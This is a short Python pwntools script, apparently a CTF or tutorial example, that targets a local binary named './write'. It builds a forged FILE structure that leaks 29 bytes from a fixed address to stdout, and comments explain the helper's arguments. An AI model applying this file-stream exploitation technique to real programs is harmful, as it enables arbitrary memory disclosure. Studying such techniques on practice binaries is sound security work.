from pwn import *
#from FilePointer import *

r=process('./write')

context.arch='amd64'

'''
The argument to FileStructure is an address containg a null value - In this example a bss address is used
'''

structure=FileStructure(null=0x6011d0)

'''
The write function will generate the payload for writing data from an arbitrary address.
It's arguments are -
        * The address from where the data is to be written (to stdout)
        * The size of data to be written
'''

payload=structure.write(addr=0x4007d4,size=29)

r.send(payload.ljust(0x78,'\x00'))
r.interactive()
print r.recvall()
